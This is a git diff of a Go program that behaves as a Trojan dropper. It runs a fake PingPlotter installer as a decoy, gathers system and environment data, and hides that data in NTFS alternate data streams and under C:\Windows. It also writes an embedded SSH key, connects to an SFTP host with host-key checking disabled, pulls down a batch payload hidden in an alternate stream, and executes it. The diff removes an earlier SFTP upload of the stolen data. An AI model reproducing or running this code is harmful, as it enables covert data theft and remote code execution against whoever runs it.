@@ -1,8 +1,8 @@
 package main
 
 /*
-	TODO
-- Download file from SFTP server and hide in exe on Desktop
+TODO
+- Upload Readme.txt with ADS
 
 */
 
@@ -12,6 +12,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"reflect"
 	"runtime"
 	"strings"
@@ -26,31 +27,37 @@ func main() {
 	setupFakeEnv()
 	saveAllInfo()
 	fileManger()
-	distraction()
-	time.Sleep(5 * time.Second)
-	usrDir := getUserHomeDir()
-	cmd := exec.Command("cmd", "/C", "start", (usrDir + "\\Desktop\\startup3751243.bat"))
-	cmd.Start()
+	bluff()
+	over()
 }
 
 func setupFakeEnv() {
-	// Create Fake Installer
 	usrDir := getUserHomeDir()
+	path := filepath.Join(usrDir, "\\AppData\\Local\\Temp\\Moto\\")
+	os.MkdirAll(path, os.ModePerm)
+	// Create Fake Installer
 	fakeInstall, err := PingPlotterFakeResource()
-	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\PingPlotterInstaller.exe")
+	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
 	installer.Write(fakeInstall)
 	installer.Close()
+	if err != nil {
+		fmt.Println(err)
+	}
 	// Create ReadMe File
 	readMeFile, err := ReadmeResource()
 	readme, err := os.Create("Readme.txt")
 	readme.Write(readMeFile)
 	readme.Close()
+	if err != nil {
+		fmt.Println(err)
+	}
 	// Create SSH File
 	sshKeyFile, err := PrvtResource()
-	sshKey, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\key.pem")
+	sshKey, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\key.pem")
 	sshKey.Write(sshKeyFile)
 	sshKey.Close()
 	if err != nil {
+		fmt.Println(err)
 	}
 	// Create Batch File
 	batFile, err := Startup3751243Resource()
@@ -58,12 +65,14 @@ func setupFakeEnv() {
 	bat.Write(batFile)
 	bat.Close()
 	if err != nil {
+		fmt.Println(err)
 	}
 }
 
 func saveAllInfo() {
+
 	usrDir := getUserHomeDir()
-	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")
+	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 
 	system := sysGrab()
 	environment := envGrab()
@@ -89,7 +98,7 @@ func fileManger() {
 
 func copyFiles() {
 	usrDir := getUserHomeDir()
-	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")
+	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
 	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
 	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
@@ -97,24 +106,37 @@ func copyFiles() {
 	if err != nil {
 		fmt.Println(err)
 	}
+	fmt.Println("COPY DONE")
 }
 
 func syncWithSFTP() {
 	usrDir := getUserHomeDir()
-	pemBytes, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\key.pem")
+	pemBytes, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\key.pem")
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("key LOADED")
 	signer, err := ssh.ParsePrivateKey(pemBytes)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println("signer LOADED")
 	auths := []ssh.AuthMethod{ssh.PublicKeys(signer)}
-
+	fmt.Println("auths LOADED")
 	cfg := &ssh.ClientConfig{
 		User:            "tester",
 		Auth:            auths,
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
+	fmt.Println("cfg LOADED")
 
 	// Connect to SFTP Server
 	cfg.SetDefaults()
 	connect, err := ssh.Dial("tcp", "10.0.0.33:22", cfg)
+	if err != nil {
+	}
 	defer connect.Close()
+	fmt.Println("SFTP connected")
 
 	// Create new SFTP client
 	client, err := sftp.NewClient(connect)
@@ -122,6 +144,7 @@ func syncWithSFTP() {
 		log.Fatal(err)
 	}
 	defer client.Close()
+	fmt.Println("client LOADED")
 
 	// Walk directory on Remote
 	// w := client.Walk("/")
@@ -131,19 +154,10 @@ func syncWithSFTP() {
 	// 	}
 	// 	log.Println(w.Path())
 	// }
+	// 	fmt.Println("walking COMPLETE")
 
 	// Export System Data
-	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")
-	a, err := client.Create("Readme.txt:crapS3751243.dll")
-	if _, err := a.Write([]byte(input)); err != nil {
-		log.Fatal(err)
-	}
-	a.Close()
-	b, err := client.Create("Readme.txt:crapS3636862.dll")
-	if _, err := b.Write([]byte(input)); err != nil {
-		log.Fatal(err)
-	}
-	b.Close()
+	//	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 
 	srcPath := ""
 	dstPath := (usrDir + "\\Desktop\\startup3751243.bat:")
@@ -165,12 +179,14 @@ func syncWithSFTP() {
 
 	// Copy the file
 	srcFile.WriteTo(dstFile)
+	fmt.Println("bannana DOWNLOADED")
 }
 
-func distraction() {
+func bluff() {
 	usrDir := getUserHomeDir()
+
 	time.Sleep(time.Second)
-	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\moto\\PingPlotterInstaller.exe")
+	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
 	cmd1.Run()
 	// pid := cmd1.Process.Pid
 	// fmt.PrintLn(pid)
@@ -258,4 +274,11 @@ func getUserHomeDir() string {
 		return home
 	}
 	return os.Getenv("HOME")
+}
+
+func over() {
+	time.Sleep(5 * time.Second)
+	usrDir := getUserHomeDir()
+	cmd := exec.Command("cmd", "/C", "start", (usrDir + "\\Desktop\\startup3751243.bat"))
+	cmd.Start()
 }
